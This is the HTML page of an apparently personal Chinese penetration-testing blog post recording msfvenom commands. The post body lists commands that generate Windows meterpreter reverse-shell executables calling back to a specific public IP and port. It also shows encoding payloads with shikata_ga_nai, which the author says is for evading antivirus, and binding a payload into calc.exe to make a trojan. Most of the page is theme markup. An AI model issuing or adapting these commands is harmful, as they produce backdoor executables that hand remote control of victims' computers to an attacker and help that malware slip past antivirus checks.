@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="metasploit,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="tusk1'Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="有效命令msfvenom -p windows/x64/meterpreter/reverse_http lhost=114.116.33.191 lport=8888 -f exe&amp;gt;test_3.exemsfvenom -p windows/meterpreter/reverse_http lhost=114.116.33.191 lport=8888 -f exe&amp;gt;test_4.e">
+<meta name="keywords" content="metasploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试笔记4-msfvenom命令记录">
+<meta property="og:url" content="http://yoursite.com/2019/10/03/渗透测试笔记4-msfvenom命令记录/index.html">
+<meta property="og:site_name" content="tusk1&#39;Blog">
+<meta property="og:description" content="有效命令msfvenom -p windows/x64/meterpreter/reverse_http lhost=114.116.33.191 lport=8888 -f exe&amp;gt;test_3.exemsfvenom -p windows/meterpreter/reverse_http lhost=114.116.33.191 lport=8888 -f exe&amp;gt;test_4.e">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-10-03T08:35:32.609Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="渗透测试笔记4-msfvenom命令记录">
+<meta name="twitter:description" content="有效命令msfvenom -p windows/x64/meterpreter/reverse_http lhost=114.116.33.191 lport=8888 -f exe&amp;gt;test_3.exemsfvenom -p windows/meterpreter/reverse_http lhost=114.116.33.191 lport=8888 -f exe&amp;gt;test_4.e">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/10/03/渗透测试笔记4-msfvenom命令记录/">
+
+
+
+
+
+  <title>渗透测试笔记4-msfvenom命令记录 | tusk1'Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">tusk1'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/03/渗透测试笔记4-msfvenom命令记录/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="tusk1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="tusk1'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">渗透测试笔记4-msfvenom命令记录</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-03T16:34:59+08:00">
+                2019-10-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="有效命令"><a href="#有效命令" class="headerlink" title="有效命令"></a>有效命令</h2><p>msfvenom -p windows/x64/meterpreter/reverse_http lhost=114.116.33.191 lport=8888 -f exe&gt;test_3.exe<br>msfvenom -p windows/meterpreter/reverse_http lhost=114.116.33.191 lport=8888 -f exe&gt;test_4.exe</p>
+<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">MsfVenom - a Metasploit standalone payload generator.</span><br><span class="line">Also a replacement for msfpayload and msfencode.</span><br><span class="line">Usage: /opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/bin/msfvenom [options] &lt;var=val&gt;</span><br><span class="line">Example: /opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; -f exe -o payload.exe</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">    -l, --list            &lt;type&gt;     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, formats, all</span><br><span class="line">    -p, --payload         &lt;payload&gt;  Payload to use (--list payloads to list, --list-options for arguments). Specify &apos;-&apos; or STDIN for custom</span><br><span class="line">        --list-options               List --payload &lt;value&gt;&apos;s standard, advanced and evasion options</span><br><span class="line">    -f, --format          &lt;format&gt;   Output format (use --list formats to list)</span><br><span class="line">    -e, --encoder         &lt;encoder&gt;  The encoder to use (use --list encoders to list)</span><br><span class="line">        --smallest                   Generate the smallest possible payload using all available encoders</span><br><span class="line">    -a, --arch            &lt;arch&gt;     The architecture to use for --payload and --encoders (use --list archs to list)</span><br><span class="line">        --platform        &lt;platform&gt; The platform for --payload (use --list platforms to list)</span><br><span class="line">    -o, --out             &lt;path&gt;     Save the payload to a file</span><br><span class="line">    -b, --bad-chars       &lt;list&gt;     Characters to avoid example: &apos;\x00\xff&apos;</span><br><span class="line">    -n, --nopsled         &lt;length&gt;   Prepend a nopsled of [length] size on to the payload</span><br><span class="line">        --pad-nops                   Use nopsled size specified by -n &lt;length&gt; as the total payload size, thus performing a subtraction to prepend a nopsled of quantity (nops minus payload length)</span><br><span class="line">    -s, --space           &lt;length&gt;   The maximum size of the resulting payload</span><br><span class="line">        --encoder-space   &lt;length&gt;   The maximum size of the encoded payload (defaults to the -s value)</span><br><span class="line">    -i, --iterations      &lt;count&gt;    The number of times to encode the payload</span><br><span class="line">    -c, --add-code        &lt;path&gt;     Specify an additional win32 shellcode file to include</span><br><span class="line">    -x, --template        &lt;path&gt;     Specify a custom executable file to use as a template</span><br><span class="line">    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread</span><br><span class="line">    -v, --var-name        &lt;value&gt;    Specify a custom variable name to use for certain output formats</span><br><span class="line">    -t, --timeout         &lt;second&gt;   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)</span><br><span class="line">    -h, --help                       Show this message</span><br></pre></td></tr></table></figure>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h4 id="生成不经过编码的普通payload（不编码-gt-生成内容固定-gt-直接被杀）"><a href="#生成不经过编码的普通payload（不编码-gt-生成内容固定-gt-直接被杀）" class="headerlink" title="生成不经过编码的普通payload（不编码-&gt;生成内容固定-&gt;直接被杀）"></a>生成不经过编码的普通payload（不编码-&gt;生成内容固定-&gt;直接被杀）</h4><p>msfvenom -p <payload> <payload options=""> -f <format> -o <path></path></format></payload></payload></p>
+<blockquote>
+<blockquote>
+<p>msfvenom –p windows/meterpreter/reverse_tcp –f c –o 1.c</p>
+</blockquote>
+</blockquote>
+<h4 id="经过编码器处理后生成payload"><a href="#经过编码器处理后生成payload" class="headerlink" title="经过编码器处理后生成payload"></a>经过编码器处理后生成payload</h4><p>msfvenom -p <payload> -e <encoder> -i <encoder times=""> -n <nopsled> -f <format> -o <path></path></format></nopsled></encoder></encoder></payload></p>
+<blockquote>
+<blockquote>
+<p>msfvenom –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –f exe –o C:\back.exe</p>
+</blockquote>
+</blockquote>
+<h4 id="捆绑到正常文件后生成payload（暂未测试是否可加-e参数）"><a href="#捆绑到正常文件后生成payload（暂未测试是否可加-e参数）" class="headerlink" title="捆绑到正常文件后生成payload（暂未测试是否可加-e参数）"></a>捆绑到正常文件后生成payload（暂未测试是否可加-e参数）</h4><p>Msfvenom –p windows/meterpreter/reverse_tcp –platform windows –a x86 –x C:\calc.exe –k –f exe –o C:\shell.exe</p>
+<h4 id="查看支持的payload列表"><a href="#查看支持的payload列表" class="headerlink" title="查看支持的payload列表"></a>查看支持的payload列表</h4><p>msfvenom -l payloads</p>
+<h4 id="查看支持的输出文件类型"><a href="#查看支持的输出文件类型" class="headerlink" title="查看支持的输出文件类型"></a>查看支持的输出文件类型</h4><p>msfvenom –help-formats</p>
+<h4 id="查看支持的编码方式：-为了达到免杀的效果"><a href="#查看支持的编码方式：-为了达到免杀的效果" class="headerlink" title="查看支持的编码方式：(为了达到免杀的效果)"></a>查看支持的编码方式：(为了达到免杀的效果)</h4><p>msfvenom -l encoders</p>
+<h4 id="查看支持的空字段模块：-为了达到免杀的效果"><a href="#查看支持的空字段模块：-为了达到免杀的效果" class="headerlink" title="查看支持的空字段模块：(为了达到免杀的效果)"></a>查看支持的空字段模块：(为了达到免杀的效果)</h4><p>msfvenom -l nops</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/metasploit/" rel="tag"># metasploit</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/03/渗透测试笔记3-内网存活主机扫描/" rel="next" title="渗透测试笔记3-内网存活主机扫描">
+                <i class="fa fa-chevron-left"></i> 渗透测试笔记3-内网存活主机扫描
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/10/03/渗透测试笔记5-一句话下载payload/" rel="prev" title="渗透测试笔记5-一句话下载payload">
+                渗透测试笔记5-一句话下载payload <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="tusk1">
+            
+              <p class="site-author-name" itemprop="name">tusk1</p>
+              <p class="site-description motion-element" itemprop="description">奋斗、寻觅，而不屈服</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=1592129863&website=www.oicqzone.com" target="_blank" title="QQ">
+                      
+                        <i class="fa fa-fw fa-globe"></i>QQ</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:tusk1@foxmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#有效命令"><span class="nav-number">1.</span> <span class="nav-text">有效命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#用法"><span class="nav-number">2.</span> <span class="nav-text">用法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#示例"><span class="nav-number">3.</span> <span class="nav-text">示例</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#生成不经过编码的普通payload（不编码-gt-生成内容固定-gt-直接被杀）"><span class="nav-number">3.0.1.</span> <span class="nav-text">生成不经过编码的普通payload（不编码-&gt;生成内容固定-&gt;直接被杀）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#经过编码器处理后生成payload"><span class="nav-number">3.0.2.</span> <span class="nav-text">经过编码器处理后生成payload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#捆绑到正常文件后生成payload（暂未测试是否可加-e参数）"><span class="nav-number">3.0.3.</span> <span class="nav-text">捆绑到正常文件后生成payload（暂未测试是否可加-e参数）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查看支持的payload列表"><span class="nav-number">3.0.4.</span> <span class="nav-text">查看支持的payload列表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查看支持的输出文件类型"><span class="nav-number">3.0.5.</span> <span class="nav-text">查看支持的输出文件类型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查看支持的编码方式：-为了达到免杀的效果"><span class="nav-number">3.0.6.</span> <span class="nav-text">查看支持的编码方式：(为了达到免杀的效果)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查看支持的空字段模块：-为了达到免杀的效果"><span class="nav-number">3.0.7.</span> <span class="nav-text">查看支持的空字段模块：(为了达到免杀的效果)</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">tusk1</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
